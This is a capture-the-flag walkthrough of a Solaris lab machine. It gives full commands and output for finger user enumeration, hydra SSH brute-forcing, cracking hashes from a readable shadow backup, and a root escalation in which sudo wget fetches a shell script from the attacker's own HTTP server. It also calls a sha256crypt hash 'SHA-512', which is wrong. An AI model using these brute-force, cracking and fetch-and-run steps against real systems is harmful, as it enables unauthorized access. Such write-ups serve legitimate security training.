## Full TCP Nmap Scan

```
nmap -p- 10.10.10.76
```

```
Nmap scan report for 10.10.10.76
Host is up (0.035s latency).
Not shown: 63933 filtered ports, 1598 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
55029/tcp open  unknown
```

```
nmap -p 79,111,22022,55029 -sV -oA full-scan-scripts 10.10.10.76
```

```
Nmap scan report for 10.10.10.76
Host is up (0.037s latency).
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
55029/tcp open  unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Thoughts Based On Full TCP Nmap Scan

Looking at the ports, there are really three that are of interest: `79 - Finger, 111 - RPCBind,` and `22022 - SunSSH 1.3`. Firstly, `79 - Finger` is a program you can use to find information about computer users. Typically this will lists full names login names, and possibly other details. This can be things like phone numbers, office locations. login tine, idle time, etc. We can enumerate users by using finger and using a tool such as `finger-user-enum.pl` which can be found from [pentestermonkey](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum). This tool essentially asks for a list of possible usernames and then attempts to find if these usernames are valid. Next is `111 - RPCBind`. Port 111 is known to be `Portmapper` which just provides information between Unix based systems. Typically when you probe this port, it can give you information about the Unix OS, and services that are being ran. This is probably the second port I will be looking at after `79 - Finger`. Lastly, there is `22022 - SunSSH 1.3`. As always, SSH is a vector I go to after I find at least a username or if I find a valid username and password as well. Since the only port that would lead me to get a username would most likely be `79 - Finger`, I will be going for that first to see if I can get any possible usernames and then see if I can just brute force a user account and gain access through SSH. With that being said, let's start this box!

## 79 - Finger | Enumeration

As I said above on my thoughts, `Finger` can be used to go and enumerate users using the tool `finger-user-enum.pl`. You can get a direct download to `finger-user-enum.pl` [here](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz). After you download it, all you have to do is navigate to the directory and then you can run the tool. To download the file you can run the following commands:

```
wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
tar -xvf finger-user-enum-1.0.tar.gz
```

This will download the file to your current directory you are in and then extract it. Go ahead and change directories into the finger-user-enum folder and you will see the `finger-user-enum.pl` file. To run it all you need to do is the following:

```
./finger-user-enum.pl -U <word_list> -t <target_ip_addr>
```

I used the `names.txt` wordlists from Seclists against the target which simply has around 10,000 common usernames. This is what my command looked like:

```
./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

```
root@kali-[/opt/finger-user-enum]./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 10.10.10.76
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Fri May 28 21:13:22 2021 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
root@10.10.10.76: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
sammy@10.10.10.76: sammy                 console      <Apr 24, 2018>..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Fri May  28 21:49:09 2021 #########
15 results.

10177 queries in 2147 seconds (4.7 queries / sec)
```

We see that we have a few users that are of interest. The one's with `pts/3` or `console` are of the most interest. This is because it seems that they have actually logged in recently which means they are valid user accounts most likely. Now that I have valid usernames, I am going to run `hydra` which is a tool used to brute force logins. Essentially it will be taking the username `sunny` and `sammy` and be testing it against a list of passwords I provide it. The password list I will be using is `probable-v2-top1575.txt`. The only reason I used this and not `rockyou.txt` is because of time. To use `hydra` and perform a brute force against the user `sunny`, we can use the following command:

```
hydra -l sunny -P /usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022  
```

```
root@kali-[~]hydra -l sunny -P /usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022                                                                                                              [0/124]
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                             

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-28 21:51:25                                                                                                                                                          
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4                                                                                                                       
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore                                                                              
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1575 login tries (l:1/p:1575), ~99 tries per task
[DATA] attacking ssh://10.10.10.76:22022/
                                                           
[STATUS] 217.00 tries/min, 217 tries in 00:01h, 1367 to do in 00:07h, 16 active                                                                                                                                                             
                                                                                                                                                                                                                                            
[STATUS] 159.00 tries/min, 477 tries in 00:03h, 1110 to do in 00:07h, 16 active                                       
[ERROR] ssh target does not support password auth                                                                                                                                                                                           
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday                                                      
1 of 1 target successfully completed, 1 valid password found                                                          
[WARNING] Writing restore file because 12 final worker threads did not complete until end.                            
[ERROR] 12 targets did not resolve or could not be connected                  
[ERROR] 0 target did not complete                                                                                     
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-28 21:57:51
```

And we can see the following output:

```
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday 
```

So the username is `sunny` and the password is `sunday`. Let's try to ssh in!

```
root@kali-[~]ssh sunny@10.10.10.76 -p 22022
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

And we get an error: "Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1." This happens because the client and server were unable to agree on the key exchange algorithm most likely because the key exchange algorithms available on this host are legacy. There is a way to force OpenSSH to enable a certain key exchange algorithm so that we can connect to this host with the `KexAlgorithms` option. Using this option and providing the key we want to use will enable that key exchange algorithm for us to use.

```
root@kali-[~]ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022
Password: 
Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$
```

And we are logged in! I'm going to try `sudo -l` which lists what commands I can run as `sudo` which can possibly escalate our privileges to the root user.

```
sudo -l
```

```
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```

Okay so we can run the file `troll` under the directory `/root/`. Interesting... Let's see what this is doing by running it.

```
sudo /root/./troll
```

```
sunny@sunday:~$ sudo /root/./troll
testing
uid=0(root) gid=0(root)
```

Looks like it is just echoing out "testing" and then using the `id` command to show the `user ID` and the `group ID` of the user. It is showing us the `root` user because we ran this with `sudo`. So that's interesting but it won't really do us any good because the file can only be edited as the `root` user.  I manually was looking around and found in the root of the file system a directory `backup`. This isn't a normal directory that is in Unix systems so I went ahead and looked in it.

```
sunny@sunday:/$ ls
backup  bin  boot  cdrom  dev  devices  etc  export  home  kernel  lib  lost+found  media  mnt  net  opt  platform  proc  root  rpool  sbin  system  tmp  usr  var
```

```
sunny@sunday:/$ ls -la backup/
total 5
drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
drwxr-xr-x 26 root root  27 2020-07-31 17:59 ..
-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
```

There is a `shadow.backup` file that I can read. If you do not know what `shadow` is. Under the `/etc/` directory is a file named `shadow`. The `shadow` file is where actual passwords are stored (in a hashed format) for user accounts. So since we can see the hash value of user accounts, we could possibly go and crack the hash using a tool like `hashcat` which will try to crack hashes given a hash and a list of possible passwords. So we can see we have two hashes: `sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::` and `sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::`. The sunny hash won't do us any good because we already have the password. Let's look into the `sammy` user account. The hash is only from the first `$` sign to the last `:`. So the hash would look like this: `$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB`.

```
sunny@sunday:/$ cat backup/shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Let's go back onto our host and put this hash into a file. You can use something like `nano` or `vim` or whatever text editor you would like to use and just paste that hash in there and name it something like `hash`. Now that we have that all we need to do is use `hashcat`, specify what type of hash this is, (SHA-512), the path to the hash (mine is in my current directory so I just write `hash` without a path), and the path to your wordlist (I went ahead and use `rockyou.txt` for this one which is a great wordlist to use to crack hashes). To identify the hash as `SHA-512`, you can look [here](https://hashcat.net/wiki/doku.php?id=example_hashes) which has a list of "Hash Modes" that `hashcat` can choose from. They show examples of what these hashes would look like and I simply looked for the hash that started with `$5$` and found that the mode is `7400`. So I went ahead and used the following command to crack the hash:

```
hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt    
```

```
hashcat (v5.1.0) starting...                                                                                          
                                        
OpenCL Platform #1: NVIDIA Corporation                                                                                
======================================                                                                                
* Device #1: GeForce GTX 1080 Ti, 2792/11170 MB allocatable, 28MCU                                                    
* Device #2: GeForce GTX 1080 Ti, 2794/11178 MB allocatable, 28MCU                                                    
                                                           
OpenCL Platform #2: The pocl project
====================================
* Device #3: pthread-AMD Ryzen 3 1200 Quad-Core Processor, skipped.

OpenCL Platform #3: Intel(R) Corporation
========================================
* Device #4: AMD Ryzen 3 1200 Quad-Core Processor, skipped. 

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256


Dictionary cache hit:                                                                                                 
* Filename..: rockyou.txt                                                                                             
* Passwords.: 14344384                                                                                                
* Bytes.....: 139921497                                                                                               
* Keyspace..: 14344384                                                                                                
                                                                                                                      
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!                                                     
                                                                                                                                                                                                                                            
Session..........: hashcat                                                                                                                                                                                                                  
Status...........: Cracked                                                                                                                                                                                                                  
Hash.Type........: sha256crypt $5$, SHA256 (Unix)                                                                     
Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB                                     
Time.Started.....: Fri Jul  2 17:17:10 2021 (2 secs)                                                                  
Time.Estimated...: Fri Jul  2 17:17:12 2021 (0 secs)                                                                  
Guess.Base.......: File (rockyou.txt)                                                                                 
Guess.Queue......: 1/1 (100.00%)                                                                                      
Speed.#1.........:    89350 H/s (8.03ms) @ Accel:64 Loops:32 Thr:64 Vec:1                                             
Speed.#2.........:    89006 H/s (8.08ms) @ Accel:64 Loops:32 Thr:64 Vec:1                                                                                                                                                                   
Speed.#*.........:   178.4 kH/s                                                                                                                                                                                                             
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts                                                         
Progress.........: 229376/14344384 (1.60%)                 
Rejected.........: 0/229376 (0.00%)                       
Restore.Point....: 0/14344384 (0.00%)                                                                                 
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000                 
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000                                                           
Candidates.#1....: 123456 -> 022580                                                                                   
Candidates.#2....: 022579 -> 170176                                                                                   
Hardware.Mon.#1..: Temp: 38c Fan: 23% Util:100% Core:1885MHz Mem:5005MHz Bus:8                                        
Hardware.Mon.#2..: Temp: 31c Fan: 22% Util:100% Core:1898MHz Mem:5005MHz Bus:8                                        
                                                                                                                      
Started: Fri Jul  2 17:16:56 2021                                                                                     
Stopped: Fri Jul  2 17:17:12 2021
```

And we see we cracked the hash. It shows the following output: `$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!   `. So the password to the user `sammy` is `cooldude!` Let's log into `sammy`'s account.

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76 -p 22022
```

```
root@kali-[~]ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76 -p 22022
Password: 
Last login: Fri Jul 31 17:59:59 2020
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$
```

I go ahead and run `sudo -l` again to lists the commands I can run as the `sammy` user with `sudo` privileges.

```
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

So we can use `wget` as the user `sammy`. `Wget` is a free utility for non-interactive download of files from the Web. So we can download files using `wget` with `sudo` privileges. This essentially means we can overwrite files from anywhere. So let's recall what information we have so far. We have the user `sunny` can run the file `/root/troll` with `sudo` privileges, and the user `sammy` can use `wget` with `sudo` privileges, meaning I can overwrite any files. So what if we overwrite the `troll` file and have it spawn a shell? Firstly let's check the path for bash so we can use a `shebang` at the beginning of the script so the program loader is instructed to run the program in the correct `bash` path.

```
sammy@sunday:~$ which bash
/usr/bin/bash
```

So bash is in `/usr/bin/bash`. Now I'm going to go back to my host and create a simple file named `troll`. Just use a text editor like `vim`, `nano`, `gedit`, etc. whatever floats your boat. With your text editor opened, put the following within the `troll` file:

```
#!/usr/bin/bash

bash
```

All this is doing is directing the program loader to use `/usr/bin/bash` and then run the command `bash` which will spawn a `bash shell`. Whatever user we are using when typing in `bash` will be the user the shell will spawn as. So if we run it with `sudo` this is going to be running it with `root permissions`, meaning we will be spawning a shell with as the root user. Now that we have the file all done, let's set up a simple HTTP server using Python. This HTTP server will be on our host simply hosting the directory we are currently in (the directory we just made the `troll` file in). 

```
python -m SimpleHTTPServer 80
```

Now go back to the `sammy` account and use `wget` to download the file and we can use the `-O` flag which will output the file into a specific path. The path I chose was `/root/troll` so it will overwrite the original `troll` file.

```
sammy@sunday:~$ sudo wget 10.10.14.36/troll -O /root/troll
--23:05:56--  http://10.10.14.36/troll
           => `/root/troll'
Connecting to 10.10.14.36:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23 [application/octet-stream]

100%[================================================================================================================================================================================================>] 23            --.--K/s             

23:05:57 (4.41 MB/s) - `/root/troll' saved [23/23]
```

Now quickly as the `sunny` user run `sudo /root/troll` right after you just overwrote the file and you should get root.

```
sunny@sunday:~$ sudo /root/troll
root@sunday:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
```

Make sure you run it ASAP after you overwrite it because there is a script that the creator implemented to ensure that the `troll` file reverts back to its original form. If you overwrite it and then run `sudo /root/troll` as the `sunny` user too late, you most likely won't get the shell because the file went back to its original form.
